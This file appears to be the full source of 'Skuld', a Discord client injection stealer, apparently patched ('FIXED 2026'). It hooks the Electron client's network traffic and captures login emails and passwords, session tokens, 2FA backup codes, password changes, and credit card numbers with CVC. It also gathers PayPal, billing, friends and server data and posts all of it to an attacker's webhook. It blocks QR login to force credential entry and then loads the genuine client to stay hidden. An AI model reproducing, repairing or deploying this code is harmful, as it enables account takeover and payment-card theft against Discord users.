// ==================== SKULD DISCORD INJECTION - FIXED 2026 ====================
const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');

const { BrowserWindow, session } = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Emloyee: { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
        Early_Supporter: { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
        House_Bravery: { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
        House_Brilliance: { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
        House_Balance: { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
        Active_Developer: { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
        Certified_Moderator: { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>", Rare: true },
        Spammer: { Value: 1048704, Emoji: "⌨️", Rare: false },
    },
};

// ==================== FIXED REQUEST (This was the main problem) ====================
const request = (method, url, headers = {}, data = null) => {
    return new Promise((resolve, reject) => {
        const parsed = new URL(url);
        const options = {
            protocol: parsed.protocol,
            hostname: parsed.hostname,
            port: parsed.port || 443,
            path: parsed.pathname + parsed.search,
            method: method,
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                ...headers
            }
        };
        if (data) options.headers['Content-Length'] = Buffer.byteLength(data);

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                console.log(`[Webhook] Status: ${res.statusCode}`);
                resolve(body);
            });
        });

        req.on('error', err => {
            console.error('[Webhook Error]', err.message);
            reject(err);
        });

        if (data) req.write(data);
        req.end();
    });
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const getToken = async () => {
    try {
        return await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    } catch { return null; }
};

const fetchData = async (endpoint, token) => {
    const data = await request("GET", CONFIG.API + endpoint, { "Authorization": token });
    return JSON.parse(data || "{}");
};

// ==================== HOOKER ====================
const hooker = async (content, token, account) => {
    try {
        content.content = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content.content || ''}`;
        content.username = "skuld - cord injection";
        content.avatar_url = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";

        content.embeds = content.embeds || [{}];
        const embed = content.embeds[0];
        embed.author = { name: account.username };
        embed.thumbnail = { url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
        embed.footer = { text: "skuld discord injection - made by hackirby", icon_url: "https://avatars.githubusercontent.com/u/145487845?v=4" };
        embed.title = "Account Information";

        const nitro = getNitro(account.premium_type);
        const badges = getBadges(account.flags);
        const billing = await getBilling(token);
        const friends = await getFriends(token);
        const servers = await getServers(token);

        embed.fields = embed.fields || [];
        embed.fields.push(
            { name: "Token", value: "```" + token + "```", inline: false },
            { name: "Nitro", value: nitro, inline: true },
            { name: "Badges", value: badges, inline: true },
            { name: "Billing", value: billing, inline: true }
        );

        content.embeds.push(
            { title: `Total Friends: ${friends.totalFriends}`, description: friends.message },
            { title: `Total Servers: ${servers.totalGuilds}`, description: servers.message }
        );

        content.embeds.forEach(e => e.color = 0xb143e3);

        await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
        console.log("[+] Webhook sent successfully!");
    } catch (err) {
        console.error("[-] Webhook failed:", err.message);
    }
};

const getNitro = f => f === 1 ? '`Nitro Classic`' : f === 2 ? '`Nitro Boost`' : f === 3 ? '`Nitro Basic`' : '`❌`';

const getBadges = flags => {
    let str = '';
    for (const key in CONFIG.badges) {
        const b = CONFIG.badges[key];
        if ((flags & b.Value) === b.Value) str += b.Emoji + ' ';
    }
    return str || '`❌`';
};

const getRareBadges = flags => {
    let str = '';
    for (const key in CONFIG.badges) {
        const b = CONFIG.badges[key];
        if ((flags & b.Value) === b.Value && b.Rare) str += b.Emoji + ' ';
    }
    return str;
};

const getBilling = async token => {
    try {
        const data = await fetchData("/billing/payment-sources", token);
        let str = '';
        data.forEach(x => {
            if (!x.invalid) str += x.type === 1 ? '💳 ' : x.type === 2 ? '<:paypal:1148653305376034967> ' : '';
        });
        return str || '`❌`';
    } catch { return '`❌`'; }
};

const getFriends = async token => {
    try {
        const friends = await fetchData("/relationships", token);
        const filtered = friends.filter(u => u.type === 1);
        let rare = "";
        for (const f of filtered) {
            const rb = getRareBadges(f.user.public_flags);
            if (rb) {
                if (!rare) rare = "**Rare Friends:**\n";
                rare += `${rb} ${f.user.username}\n`;
            }
        }
        return { message: rare || "**No Rare Friends**", totalFriends: friends.length };
    } catch { return { message: "**No Rare Friends**", totalFriends: 0 }; }
};

const getServers = async token => {
    try {
        const guilds = await fetchData("/guilds?with_counts=true", token);
        const filtered = guilds.filter(g => ['562949953421311', '2251799813685247'].includes(String(g.permissions)));
        let rare = "";
        for (const g of filtered) {
            if (!rare) rare = "**Rare Servers:**\n";
            rare += `${g.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | \`${g.name}\` - ${g.approximate_member_count} members\n`;
        }
        return { message: rare || "**No Rare Servers**", totalGuilds: guilds.length };
    } catch { return { message: "**No Rare Servers**", totalGuilds: 0 }; }
};

// ==================== EVENT HANDLERS ====================
const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchData("", token);
    hooker({
        content: `**${account.username}** just ${action}!`,
        embeds: [{ fields: [
            { name: "Email", value: `\`${email}\``, inline: true },
            { name: "Password", value: `\`${password}\``, inline: true }
        ]}]
    }, token, account);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchData("", token);
    const filtered = codes.filter(c => !c.consumed);
    const msg = filtered.map(c => `${c.code.substr(0,4)}-${c.code.substr(4)}`).join('\n');
    hooker({
        content: `**${account.username}** just viewed his 2FA backup codes!`,
        embeds: [{ fields: [
            { name: "Backup Codes", value: "```" + msg + "```", inline: false },
            { name: "Email", value: `\`${account.email}\``, inline: true },
            { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
        ]}]
    }, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchData("", token);
    hooker({
        content: `**${account.username}** just changed his password!`,
        embeds: [{ fields: [
            { name: "New Password", value: `\`${newPassword}\``, inline: true },
            { name: "Old Password", value: `\`${oldPassword}\``, inline: true }
        ]}]
    }, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchData("", token);
    hooker({
        content: `**${account.username}** just added a credit card!`,
        embeds: [{ fields: [
            { name: "Number", value: `\`${number}\``, inline: true },
            { name: "CVC", value: `\`${cvc}\``, inline: true },
            { name: "Expiration", value: `\`${month}/${year}\``, inline: true }
        ]}]
    }, token, account);
};

const PaypalAdded = async (token) => {
    const account = await fetchData("", token);
    hooker({
        content: `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        embeds: [{ fields: [
            { name: "Email", value: `\`${account.email}\``, inline: true },
            { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
        ]}]
    }, token, account);
};

// ==================== MAIN ====================
console.log("[+] Skuld Injection Loaded");

let initiationCalled = false;
let email = "", password = "";

const createWindow = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            initiationCalled = true;
            console.log("[+] Debugger Attached");
        }

        if (method !== 'Network.responseReceived' || ![200, 202].includes(params.response.status)) return;
        if (!['/login','/register','/totp','/codes-verification','/@me'].some(u => params.response.url.includes(u))) return;

        try {
            const resp = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
            const req = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });

            const rData = JSON.parse(resp.body || '{}');
            const qData = JSON.parse(req.postData || '{}');

            if (params.response.url.includes('/login')) {
                if (rData.token) EmailPassToken(qData.login, qData.password, rData.token, "logged in");
                else { email = qData.login; password = qData.password; }
            } else if (params.response.url.includes('/register')) {
                EmailPassToken(qData.email, qData.password, rData.token, "signed up");
            } else if (params.response.url.includes('/totp')) {
                EmailPassToken(email, password, rData.token, "logged in with 2FA");
            } else if (params.response.url.includes('/codes-verification')) {
                BackupCodesViewed(rData.backup_codes, await getToken());
            } else if (params.response.url.includes('/@me') && qData.password) {
                if (qData.new_password) PasswordChanged(qData.new_password, qData.password, rData.token);
                if (qData.email) EmailPassToken(qData.email, qData.password, rData.token, "changed email");
            }
        } catch (e) {}
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
};

createWindow();

// Payment Handlers
session.defaultSession.webRequest.onCompleted({
    urls: [
        'https://api.stripe.com/v*/tokens',
        'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts'
    ]
}, async (details) => {
    if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
    try {
        if (details.url.includes('tokens')) {
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
        } else {
            PaypalAdded(await getToken());
        }
    } catch (e) {}
});

session.defaultSession.webRequest.onBeforeRequest({ urls: ['wss://remote-auth-gateway.discord.gg/*'] }, (_, callback) => {
    callback({ cancel: true });
});

module.exports = require("./core.asar");

console.log("[+] Skuld Injection Ready - Waiting for login/actions...");
